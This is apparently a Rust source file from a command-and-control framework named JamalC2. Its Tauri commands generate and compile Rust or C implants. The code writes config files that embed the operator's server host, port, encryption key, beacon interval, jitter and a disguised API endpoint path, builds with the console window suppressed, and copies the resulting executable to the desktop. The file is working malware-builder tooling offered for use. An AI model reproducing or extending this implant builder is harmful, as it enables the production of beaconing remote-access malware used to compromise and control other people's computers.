//! Implant 生成器 Tauri 命令

use serde::{Deserialize, Serialize};
use std::fs;
use std::path::PathBuf;
use std::process::Command;

#[derive(Debug, Deserialize)]
pub struct BuildRequest {
    pub server_host: String,
    pub server_port: u16,
    pub use_tls: bool,
    pub tag: String,
    pub output_name: String,
    pub encryption_key: String,
    #[serde(default)]
    pub skip_key_check: bool,
    /// Implant 类型: "rust" 或 "c"
    #[serde(default = "default_implant_type")]
    pub implant_type: String,
}

fn default_implant_type() -> String {
    "rust".to_string()
}

#[derive(Debug, Serialize)]
pub struct BuildResult {
    pub success: bool,
    pub output_path: Option<String>,
    pub error: Option<String>,
}

/// 查找 implant 模板目录 (Rust)
fn find_implant_template() -> Option<PathBuf> {
    let candidates = [
        PathBuf::from("D:/project1/jamalC2/implant"),
        PathBuf::from("../implant"),
        PathBuf::from("../../implant"),
        std::env::current_exe().ok().and_then(|p| {
            p.parent()
                .and_then(|p| p.parent())
                .and_then(|p| p.parent())
                .and_then(|p| p.parent())
                .and_then(|p| p.parent())
                .map(|p| p.join("implant"))
        }).unwrap_or_default(),
    ];
    
    for candidate in candidates {
        if candidate.exists() && candidate.join("Cargo.toml").exists() {
            return Some(candidate);
        }
    }
    
    None
}

/// 查找 C implant 模板目录
fn find_implant_c_template() -> Option<PathBuf> {
    let candidates = [
        PathBuf::from("D:/project1/jamalC2/implant-c"),
        PathBuf::from("../implant-c"),
        PathBuf::from("../../implant-c"),
        std::env::current_exe().ok().and_then(|p| {
            p.parent()
                .and_then(|p| p.parent())
                .and_then(|p| p.parent())
                .and_then(|p| p.parent())
                .and_then(|p| p.parent())
                .map(|p| p.join("implant-c"))
        }).unwrap_or_default(),
    ];
    
    for candidate in candidates {
        if candidate.exists() && candidate.join("src").join("main.c").exists() {
            return Some(candidate);
        }
    }
    
    None
}

/// 生成 Implant (分发器)
#[tauri::command]
pub async fn build_implant(request: BuildRequest) -> Result<BuildResult, String> {
    match request.implant_type.as_str() {
        "c" => build_c_implant(request).await,
        _ => build_rust_implant(request).await,
    }
}

/// 编译 Rust Implant
async fn build_rust_implant(request: BuildRequest) -> Result<BuildResult, String> {
    let implant_template_dir = find_implant_template()
        .ok_or_else(|| {
            "Rust Implant template not found. Please ensure 'implant' directory exists at D:/project1/jamalC2/implant".to_string()
        })?;
    
    let shared_dir = implant_template_dir.parent()
        .map(|p| p.join("shared"))
        .ok_or("Cannot find shared directory")?;
    
    if !shared_dir.exists() {
        return Err(format!("Shared library not found at: {:?}", shared_dir));
    }
    
    let build_dir = std::env::temp_dir().join(format!("jamalc2_build_{}", uuid::Uuid::new_v4()));
    fs::create_dir_all(&build_dir).map_err(|e| e.to_string())?;
    
    let temp_implant_dir = build_dir.join("implant");
    copy_dir_recursive(&implant_template_dir, &temp_implant_dir).map_err(|e| e.to_string())?;
    
    let temp_shared_dir = build_dir.join("shared");
    copy_dir_recursive(&shared_dir, &temp_shared_dir).map_err(|e| e.to_string())?;
    
    let config_path = temp_implant_dir.join("src").join("config.rs");
    let config_content = generate_rust_config(&request);
    fs::write(&config_path, config_content).map_err(|e| e.to_string())?;
    
    #[cfg(windows)]
    let output = {
        use std::os::windows::process::CommandExt;
        const CREATE_NO_WINDOW: u32 = 0x08000000;
        Command::new("cargo")
            .args(["build", "--release"])
            .current_dir(&temp_implant_dir)
            .creation_flags(CREATE_NO_WINDOW)
            .output()
            .map_err(|e| e.to_string())?
    };
    
    #[cfg(not(windows))]
    let output = {
        Command::new("cargo")
            .args(["build", "--release"])
            .current_dir(&temp_implant_dir)
            .output()
            .map_err(|e| e.to_string())?
    };
    
    if !output.status.success() {
        let stderr = String::from_utf8_lossy(&output.stderr);
        let _ = fs::remove_dir_all(&build_dir);
        return Ok(BuildResult {
            success: false,
            output_path: None,
            error: Some(format!("Build failed: {}", stderr)),
        });
    }
    
    let built_exe = temp_implant_dir.join("target").join("release").join("implant.exe");
    let output_dir = dirs::desktop_dir().unwrap_or_else(|| PathBuf::from("."));
    let output_path = output_dir.join(format!("{}.exe", request.output_name));
    
    fs::copy(&built_exe, &output_path).map_err(|e| e.to_string())?;
    
    let _ = fs::remove_dir_all(&build_dir);
    
    Ok(BuildResult {
        success: true,
        output_path: Some(output_path.to_string_lossy().to_string()),
        error: None,
    })
}

/// 编译 C Implant
async fn build_c_implant(request: BuildRequest) -> Result<BuildResult, String> {
    let implant_c_dir = find_implant_c_template()
        .ok_or_else(|| {
            "C Implant template not found. Please ensure 'implant-c' directory exists at D:/project1/jamalC2/implant-c".to_string()
        })?;
    
    // 创建临时构建目录
    let build_dir = std::env::temp_dir().join(format!("jamalc2_c_build_{}", uuid::Uuid::new_v4()));
    fs::create_dir_all(&build_dir).map_err(|e| e.to_string())?;
    
    // 复制 implant-c 源码到临时目录
    let temp_implant_dir = build_dir.join("implant-c");
    copy_dir_recursive(&implant_c_dir, &temp_implant_dir).map_err(|e| e.to_string())?;
    
    // 生成 config.h
    let config_path = temp_implant_dir.join("src").join("config.h");
    let config_content = generate_c_config(&request);
    fs::write(&config_path, config_content).map_err(|e| e.to_string())?;
    
    // 创建输出目录
    let temp_build_output = temp_implant_dir.join("build");
    fs::create_dir_all(&temp_build_output).map_err(|e| e.to_string())?;
    
    // 使用 cmd /c 调用 build.bat 编译
    #[cfg(windows)]
    let output = {
        use std::os::windows::process::CommandExt;
        const CREATE_NO_WINDOW: u32 = 0x08000000;
        Command::new("cmd")
            .args(["/c", "build.bat"])
            .current_dir(&temp_implant_dir)
            .creation_flags(CREATE_NO_WINDOW)
            .output()
            .map_err(|e| e.to_string())?
    };
    
    #[cfg(not(windows))]
    let output = {
        return Err("C Implant can only be built on Windows".to_string());
    };
    
    if !output.status.success() {
        let stderr = String::from_utf8_lossy(&output.stderr);
        let stdout = String::from_utf8_lossy(&output.stdout);
        let _ = fs::remove_dir_all(&build_dir);
        return Ok(BuildResult {
            success: false,
            output_path: None,
            error: Some(format!("C Build failed:\nstdout: {}\nstderr: {}", stdout, stderr)),
        });
    }
    
    // 查找生成的 exe
    let built_exe = temp_implant_dir.join("build").join("implant.exe");
    if !built_exe.exists() {
        let _ = fs::remove_dir_all(&build_dir);
        return Ok(BuildResult {
            success: false,
            output_path: None,
            error: Some("Build completed but implant.exe not found".to_string()),
        });
    }
    
    // 复制到桌面
    let output_dir = dirs::desktop_dir().unwrap_or_else(|| PathBuf::from("."));
    let output_path = output_dir.join(format!("{}.exe", request.output_name));
    
    fs::copy(&built_exe, &output_path).map_err(|e| e.to_string())?;
    
    // 清理临时目录
    let _ = fs::remove_dir_all(&build_dir);
    
    Ok(BuildResult {
        success: true,
        output_path: Some(output_path.to_string_lossy().to_string()),
        error: None,
    })
}

/// 生成 Rust 配置文件内容
fn generate_rust_config(request: &BuildRequest) -> String {
    format!(r#"//! Implant 配置
//! 这些值会在生成时被 Builder 修改

/// 服务器地址 (IP 或域名)
pub const SERVER_HOST: &str = "{}";

/// 服务器端口
pub const SERVER_PORT: u16 = {};

/// 使用 HTTPS
pub const USE_TLS: bool = {};

/// 客户端标签
pub const TAG: &str = "{}";

/// Beacon 轮询间隔 (秒)
pub const HEARTBEAT_INTERVAL: u64 = 30;

/// 重连延迟 (秒)
pub const RECONNECT_DELAY: u64 = 5;

/// 版本号
pub const VERSION: &str = "1.0.0";

/// 加密密钥 (64 hex chars = 32 bytes)
pub const ENCRYPTION_KEY: &str = "{}";

/// 是否跳过启动密钥检查
pub const SKIP_KEY_CHECK: bool = {};

/// 获取服务器 HTTP URL
pub fn get_http_url() -> String {{
    let scheme = if USE_TLS {{ "https" }} else {{ "http" }};
    format!("{{}}://{{}}:{{}}", scheme, SERVER_HOST, SERVER_PORT)
}}

// 兼容函数
pub fn get_server_host() -> &'static str {{ SERVER_HOST }}
pub fn get_server_port() -> u16 {{ SERVER_PORT }}
pub fn get_use_tls() -> bool {{ USE_TLS }}
pub fn get_tag() -> &'static str {{ TAG }}
pub fn get_encryption_key() -> &'static str {{ ENCRYPTION_KEY }}
"#, request.server_host, request.server_port, request.use_tls, request.tag, request.encryption_key, request.skip_key_check)
}

/// 生成 C 配置文件内容 (config.h)
fn generate_c_config(request: &BuildRequest) -> String {
    let use_tls = if request.use_tls { 1 } else { 0 };
    let skip_key_check = if request.skip_key_check { 1 } else { 0 };
    format!(r#"/*
 * JamalC2 Implant - Configuration Header
 * This file is auto-generated by the Builder
 */

#ifndef CONFIG_H
#define CONFIG_H

// Server Configuration
#define SERVER_HOST "{}"
#define SERVER_PORT {}
#define USE_TLS {}

// Client Configuration
#define TAG "{}"
#define VERSION "1.0.0"

// Beacon Configuration
#define HEARTBEAT_INTERVAL 30 // seconds
#define RECONNECT_DELAY 5     // seconds
#define JITTER_PERCENT 20     // 0-100%

// Encryption Key (64 hex chars = 32 bytes)
#define ENCRYPTION_KEY \
  "{}"

// Run Key (for execution validation)
#define RUN_KEY "321"
#define SKIP_KEY_CHECK {}

// API Paths (all requests go to same endpoint, type is in encrypted payload)
#define API_CHECKIN "/api/CpHDCPSvc"
#define API_RESULT "/api/CpHDCPSvc"

// Debug mode (set to 0 to disable all console output)
#define DEBUG_MODE 0

// Debug print macro
#if DEBUG_MODE
    #define DEBUG_PRINT(...) printf(__VA_ARGS__)
#else
    #define DEBUG_PRINT(...) ((void)0)
#endif

#endif // CONFIG_H
"#, request.server_host, request.server_port, use_tls, request.tag, request.encryption_key, skip_key_check)
}

/// 递归复制目录
fn copy_dir_recursive(src: &PathBuf, dst: &PathBuf) -> std::io::Result<()> {
    if !dst.exists() {
        fs::create_dir_all(dst)?;
    }
    
    for entry in fs::read_dir(src)? {
        let entry = entry?;
        let src_path = entry.path();
        let dst_path = dst.join(entry.file_name());
        
        if src_path.is_dir() {
            // 跳过 target 目录
            if entry.file_name() == "target" {
                continue;
            }
            copy_dir_recursive(&src_path, &dst_path)?;
        } else {
            fs::copy(&src_path, &dst_path)?;
        }
    }
    
    Ok(())
}
